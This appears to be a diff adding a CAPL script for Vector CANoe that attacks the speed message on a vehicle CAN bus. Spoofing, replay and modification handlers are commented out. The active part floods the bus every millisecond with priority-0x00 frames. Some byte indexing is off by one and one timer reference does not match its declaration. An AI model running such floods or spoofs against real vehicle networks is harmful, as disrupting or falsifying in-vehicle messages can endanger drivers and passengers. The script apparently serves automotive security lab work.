@@ -1,0 +1,80 @@
+/*@!Encoding:1252*/
+/////////////////////////
+//
+//Attack on speed message
+//
+/////////////////////////
+includes
+{
+  
+}
+
+variables
+{
+ // msTimer timer_5ms;
+    msTimer timer_1ms;
+  message 0x12 Spoof_message;
+  message 0x12 Replayed_message;
+  message 0x12 Modifiy_message;
+  message 0x00 flood_message;
+}
+
+on start
+{
+ // setTimer(timer_5ms,5);
+  setTimer(timer_1ms,1);
+}
+
+
+/*//Read Attack
+on message CAN1.*
+{
+  if (this.id==0x12)
+  {
+   // snprintf(buffer, bufferSize, "Bit error");
+    
+  }
+}
+
+//Spoof Attack
+on timer spoof_5ms
+{
+ Spoof_message.Speed=100;
+ output(Spoof_message);
+ setTimer(timer_5ms,5);
+}
+
+
+
+//Replay Attack
+on message CAN1.*
+{
+  if (this.id==0x12)
+  {
+    Replayed_message.Speed=this.byte(this.DataLength)/10;
+  }
+}
+on timer timer_5ms
+{
+   output(Replayed_message);
+   setTimer(timer_5ms,5);
+}
+
+//Modify Attack
+on message CAN1.*
+{
+  if (this.id==0x12)
+  {
+     Modifiy_message.Speed=this.byte(this.DataLength)/10;
+    
+  }
+}*/
+
+//Flood Attack
+on timer timer_1ms
+{
+  flood_message.DataLength=8;
+  flood_message.byte(8)=0x00;
+  output(flood_message);
+  setTimer(timer_1ms,1);
+}
